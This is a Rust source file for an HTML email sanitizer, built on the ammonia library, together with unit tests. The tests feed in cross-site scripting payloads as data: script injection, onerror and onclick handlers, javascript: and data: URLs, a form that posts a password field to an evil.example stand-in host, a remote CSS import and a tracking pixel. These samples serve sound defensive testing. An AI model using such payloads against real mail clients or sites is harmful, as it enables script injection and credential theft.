#![forbid(unsafe_code)]
//! HTML email sanitizer per SPEC §7.2.
//!
//! Policy (V0):
//! - Real HTML5 parsing via ammonia/html5ever — never regex.
//! - `<script>`, `<style>`, `<object>`, `<embed>`, `<form>`, `<iframe>`,
//!   `<svg>`, `<math>` removed (content of script/style dropped entirely).
//! - All event-handler attributes and inline `style` attributes stripped
//!   (ammonia allowlist: they are simply not allowed).
//! - URL schemes restricted to http/https/mailto/cid; `javascript:` and
//!   `data:` URLs are neutralized by the scheme allowlist.
//! - Remote images are OFF by default: any `<img src>` that is not a
//!   `cid:` reference has its `src` removed (SPEC §7.2 remote-content
//!   policy; the proxy arrives in a later milestone).

use std::collections::HashSet;

// The wasm-bindgen surface (plan §1.3): sanitize decrypted E2EE HTML in the browser
// crypto worker, never on the server. Gated on the wasm32 target so the native build
// never links wasm-bindgen and the engine consumers (mw-render/mw-export/mw-server)
// stay unchanged; the sanitize policy below is target-agnostic. e8b builds it to wasm
// via `scripts/build-wasm.*` into `apps/web/src/wasm/mw-sanitize`.
#[cfg(target_arch = "wasm32")]
mod wasm;

/// Sanitize untrusted HTML email content. Always returns owned, safe HTML.
pub fn sanitize_email_html(input: &str) -> String {
    let mut builder = ammonia::Builder::default();

    // Everything dangerous is already outside ammonia's default allowlist
    // (script/style/iframe/object/embed/form, event handlers, style attrs).
    // Explicitly drop the *content* of these too, not just the tags:
    let mut clean_content: HashSet<&str> = HashSet::new();
    clean_content.insert("script");
    clean_content.insert("style");
    builder.clean_content_tags(clean_content);

    // Restrict URL schemes (kills javascript: and data:text/html).
    let mut schemes: HashSet<&str> = HashSet::new();
    schemes.insert("http");
    schemes.insert("https");
    schemes.insert("mailto");
    schemes.insert("cid");
    builder.url_schemes(schemes);

    // Deny relative URLs — emails have no trusted base.
    builder.url_relative(ammonia::UrlRelative::Deny);

    // Remote images off by default: strip non-cid img@src.
    builder.attribute_filter(|element, attribute, value| {
        if element == "img" && attribute == "src" && !value.starts_with("cid:") {
            return None;
        }
        Some(value.into())
    });

    // Links open nowhere implicitly; add rel hardening.
    builder.link_rel(Some("noopener noreferrer nofollow"));

    builder.clean(input).to_string()
}

#[cfg(test)]
mod tests {
    use super::sanitize_email_html as clean;

    #[test]
    fn strips_script_tags_and_content() {
        let out = clean(r#"<p>hi</p><script>window.__pwned=1</script>"#);
        assert!(!out.contains("script"));
        assert!(!out.contains("__pwned"));
        assert!(out.contains("<p>hi</p>"));
    }

    #[test]
    fn strips_event_handlers() {
        let out = clean(r#"<img src="cid:x" onerror="alert(1)"><div onclick="x()">a</div>"#);
        assert!(!out.contains("onerror"));
        assert!(!out.contains("onclick"));
        assert!(!out.contains("alert(1)"));
    }

    #[test]
    fn neutralizes_javascript_urls() {
        let out = clean(r#"<a href="javascript:alert(1)">x</a>"#);
        assert!(!out.contains("javascript:"));
    }

    #[test]
    fn neutralizes_data_html_urls() {
        let out = clean(r#"<a href="data:text/html,<script>1</script>">x</a>"#);
        assert!(!out.contains("data:"));
    }

    #[test]
    fn removes_forms_iframes_objects_embeds() {
        let out = clean(
            r#"<form action="https://evil.example/steal"><input name="pw"></form>
               <iframe src="https://evil.example"></iframe>
               <object data="x"></object><embed src="x">"#,
        );
        for needle in ["<form", "<iframe", "<object", "<embed", "evil.example"] {
            assert!(!out.contains(needle), "found {needle} in {out}");
        }
    }

    #[test]
    fn strips_style_tag_and_inline_style() {
        let out = clean(
            r#"<style>@import url(https://evil.example/x.css);</style>
               <div style="position:fixed;top:0">overlay</div>"#,
        );
        assert!(!out.contains("@import"));
        assert!(!out.contains("position:fixed"));
        assert!(!out.contains("style="));
        assert!(out.contains("overlay"));
    }

    #[test]
    fn blocks_remote_images_keeps_cid() {
        let out = clean(r#"<img src="https://tracker.evil/p.gif"><img src="cid:inline1">"#);
        assert!(!out.contains("tracker.evil"));
        assert!(out.contains("cid:inline1"));
    }

    #[test]
    fn hardens_link_rel() {
        let out = clean(r#"<a href="https://example.org">x</a>"#);
        assert!(out.contains("noopener"));
        assert!(out.contains("noreferrer"));
    }

    #[test]
    fn survives_malformed_soup() {
        // Parser bombs / nesting abuse must not panic and must stay safe.
        let bomb = "<div>".repeat(2000) + "<script>1</script>" + &"</div>".repeat(1999);
        let out = clean(&bomb);
        assert!(!out.contains("script"));
    }
}
